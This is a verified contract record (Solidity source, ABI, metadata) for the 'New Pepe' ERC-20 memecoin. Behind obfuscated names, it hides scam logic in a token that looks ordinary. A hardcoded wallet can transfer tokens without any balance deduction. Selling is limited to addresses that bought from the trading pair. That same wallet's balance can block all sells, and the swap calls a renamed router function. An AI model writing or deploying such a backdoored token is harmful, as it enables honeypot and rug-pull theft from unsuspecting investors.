{"SourceCode": "/**\r\n\r\nNew Pepe   $PEPE\r\nPepe is here to make memecoins great again.\r\n$PEPE is a coin for the people, forever. Fueled by pure memetic power, let $PEPE show you the way.\r\n\r\n\r\nTwitter: https://twitter.com/npepe_erc\r\nTelegram: https://t.me/npepe_erc\r\nWebsite: https://newpepe.org/\r\n\r\n**/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath\");\r\n        return c;\r\n    }\r\n\r\n    function  _rwkje(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _rwkje(a, b, \"SafeMath\");\r\n    }\r\n\r\n    function  _rwkje(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface _fwaFafdry {\r\n    function createPair(address\r\n     tokenA, address tokenB) external\r\n      returns (address pair);\r\n}\r\n\r\ninterface _staprvuew {\r\n    function rewnsForreSupporrew(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[\r\n            \r\n        ] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure \r\n    returns (address);\r\n    function WETH() external pure \r\n    returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint \r\n    amountToken, uint amountETH\r\n    , uint liquidity);\r\n}\r\n\r\ncontract NewPepe is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    _staprvuew private _Trceybk;\r\n    address payable private _Fiykueq;\r\n    address private _corteu;\r\n\r\n    string private constant _name = unicode\"New Pepe\";\r\n    string private constant _symbol = unicode\"PEPE\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _cTotalck = 4206900000 * 10 **_decimals;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _pakhzar;\r\n    mapping (address => bool) private _yrbioy;\r\n    mapping(address => uint256) private _ahjukq;\r\n    uint256 public _qvrvbcd = _cTotalck;\r\n    uint256 public _Wiorsoe = _cTotalck;\r\n    uint256 public _refTjvu= _cTotalck;\r\n    uint256 public _XoyTevf= _cTotalck;\r\n\r\n    uint256 private _BuyinitialTax=1;\r\n    uint256 private _SellinitialTax=1;\r\n    uint256 private _BuyfinalTax=1;\r\n    uint256 private _SellfinalTax=1;\r\n    uint256 private _BuyAreduceTax=1;\r\n    uint256 private _SellAreduceTax=1;\r\n    uint256 private _yfgvlq=0;\r\n    uint256 private _uerpjog=0;\r\n    \r\n\r\n    bool private _efecivnr;\r\n    bool public _Dbforkf = false;\r\n    bool private pjqvxae = false;\r\n    bool private _opgveu = false;\r\n\r\n\r\n    event _hzqwrpt(uint _qvrvbcd);\r\n    modifier uyvsvr {\r\n        pjqvxae = true;\r\n        _;\r\n        pjqvxae = false;\r\n    }\r\n\r\n    constructor () {      \r\n        _balances[_msgSender(\r\n\r\n        )] = _cTotalck;\r\n        _pakhzar[owner(\r\n\r\n        )] = true;\r\n        _pakhzar[address\r\n        (this)] = true;\r\n        _pakhzar[\r\n            _Fiykueq] = true;\r\n        _Fiykueq = \r\n        payable (0xaD82387862D70420B21F017d682436DA5293669e);\r\n\r\n \r\n\r\n        emit Transfer(\r\n            address(0), \r\n            _msgSender(\r\n\r\n            ), _cTotalck);\r\n              \r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _cTotalck;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rwkje(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 ksudrk=0;\r\n        if (from !=\r\n         owner () && to \r\n         != owner ( ) ) {\r\n\r\n            if (_Dbforkf) {\r\n                if (to \r\n                != address\r\n                (_Trceybk) \r\n                && to !=\r\n                 address\r\n                 (_corteu)) {\r\n                  require(_ahjukq\r\n                  [tx.origin]\r\n                   < block.number,\r\n                  \"Only one transfer per block allowed.\"\r\n                  );\r\n                  _ahjukq\r\n                  [tx.origin] \r\n                  = block.number;\r\n                }\r\n            }\r\n\r\n            if (from ==\r\n             _corteu && to != \r\n            address(_Trceybk) &&\r\n             !_pakhzar[to] ) {\r\n                require(amount \r\n                <= _qvrvbcd,\r\n                 \"Exceeds the _qvrvbcd.\");\r\n                require(balanceOf\r\n                (to) + amount\r\n                 <= _Wiorsoe,\r\n                  \"Exceeds the macxizse.\");\r\n                if(_uerpjog\r\n                < _yfgvlq){\r\n                  require\r\n                  (! _eiqkcz(to));\r\n                }\r\n                _uerpjog++;\r\n                 _yrbioy\r\n                 [to]=true;\r\n                ksudrk = amount._pvr\r\n                ((_uerpjog>\r\n                _BuyAreduceTax)?\r\n                _BuyfinalTax:\r\n                _BuyinitialTax)\r\n                .div(100);\r\n            }\r\n\r\n            if(to == _corteu &&\r\n             from!= address(this) \r\n            && !_pakhzar[from] ){\r\n                require(amount <= \r\n                _qvrvbcd && \r\n                balanceOf(_Fiykueq)\r\n                <_XoyTevf,\r\n                 \"Exceeds the _qvrvbcd.\");\r\n                ksudrk = amount._pvr((_uerpjog>\r\n                _SellAreduceTax)?\r\n                _SellfinalTax:\r\n                _SellinitialTax)\r\n                .div(100);\r\n                require(_uerpjog>\r\n                _yfgvlq &&\r\n                 _yrbioy[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = \r\n            balanceOf(address(this));\r\n            if (!pjqvxae \r\n            && to == _corteu &&\r\n             _opgveu &&\r\n             contractTokenBalance>\r\n             _refTjvu \r\n            && _uerpjog>\r\n            _yfgvlq&&\r\n             !_pakhzar[to]&&\r\n              !_pakhzar[from]\r\n            ) {\r\n                _transferFrom( _wvedf(amount, \r\n                _wvedf(contractTokenBalance,\r\n                _XoyTevf)));\r\n                uint256 contractETHBalance \r\n                = address(this)\r\n                .balance;\r\n                if(contractETHBalance \r\n                > 0) {\r\n                    _xwvueo(address\r\n                    (this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(ksudrk>0){\r\n          _balances[address\r\n          (this)]=_balances\r\n          [address\r\n          (this)].\r\n          add(ksudrk);\r\n          emit\r\n           Transfer(from,\r\n           address\r\n           (this),ksudrk);\r\n        }\r\n        _balances[from\r\n        ]= _rwkje(from,\r\n         _balances[from]\r\n         , amount);\r\n        _balances[to]=\r\n        _balances[to].\r\n        add(amount.\r\n         _rwkje(ksudrk));\r\n        emit Transfer\r\n        (from, to, \r\n        amount.\r\n         _rwkje(ksudrk));\r\n    }\r\n\r\n    function _transferFrom(uint256\r\n     tokenAmount) private\r\n      uyvsvr {\r\n        if(tokenAmount==\r\n        0){return;}\r\n        if(!_efecivnr)\r\n        {return;}\r\n        address[\r\n\r\n        ] memory path =\r\n         new address[](2);\r\n        path[0] = \r\n        address(this);\r\n        path[1] = \r\n        _Trceybk.WETH();\r\n        _approve(address(this),\r\n         address(\r\n             _Trceybk), \r\n             tokenAmount);\r\n        _Trceybk.\r\n        rewnsForreSupporrew\r\n        (\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address\r\n            (this),\r\n            block.\r\n            timestamp\r\n        );\r\n    }\r\n\r\n    function  _wvedf\r\n    (uint256 a, \r\n    uint256 b\r\n    ) private pure\r\n     returns \r\n     (uint256){\r\n      return ( a > b\r\n      )?\r\n      b : a ;\r\n    }\r\n\r\n    function  _rwkje(address\r\n     from, uint256 a,\r\n      uint256 b) \r\n      private view\r\n       returns(uint256){\r\n        if(from \r\n        == _Fiykueq){\r\n            return a ;\r\n        }else{\r\n            return a .\r\n             _rwkje (b);\r\n        }\r\n    }\r\n\r\n    function removeLimitas (\r\n        \r\n    ) external onlyOwner{\r\n        _qvrvbcd = _cTotalck;\r\n        _Wiorsoe = _cTotalck;\r\n        emit _hzqwrpt(_cTotalck);\r\n    }\r\n\r\n    function _eiqkcz(address \r\n    account) private view \r\n    returns (bool) {\r\n        uint256 eurcdv;\r\n        assembly {\r\n            eurcdv :=\r\n             extcodesize\r\n             (account)\r\n        }\r\n        return eurcdv > \r\n        0;\r\n    }\r\n\r\n    function _xwvueo(uint256\r\n    amount) private {\r\n        _Fiykueq.\r\n        transfer(\r\n            amount);\r\n    }\r\n\r\n    function openoTrading ( \r\n\r\n    ) external onlyOwner ( ) {\r\n        require (\r\n            ! _efecivnr ) ;\r\n        _Trceybk  \r\n        =  \r\n        _staprvuew\r\n        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address\r\n        (this), address(\r\n            _Trceybk), \r\n            _cTotalck);\r\n        _corteu = \r\n        _fwaFafdry(_Trceybk.\r\n        factory( ) \r\n        ). createPair (\r\n            address(this\r\n            ),  _Trceybk .\r\n             WETH ( ) );\r\n        _Trceybk.addLiquidityETH\r\n        {value: address\r\n        (this).balance}\r\n        (address(this)\r\n        ,balanceOf(address\r\n        (this)),0,0,owner(),block.\r\n        timestamp);\r\n        IERC20(_corteu).\r\n        approve(address(_Trceybk), \r\n        type(uint)\r\n        .max);\r\n        _opgveu = true;\r\n        _efecivnr = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_qvrvbcd\",\"type\":\"uint256\"}],\"name\":\"_hzqwrpt\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_Dbforkf\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_Wiorsoe\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_XoyTevf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_qvrvbcd\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_refTjvu\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimitas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "NewPepe", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://65c3d62fff61acfaa22691616ffdbcd2bc94516d3565d239e9400d302e13f5ff"}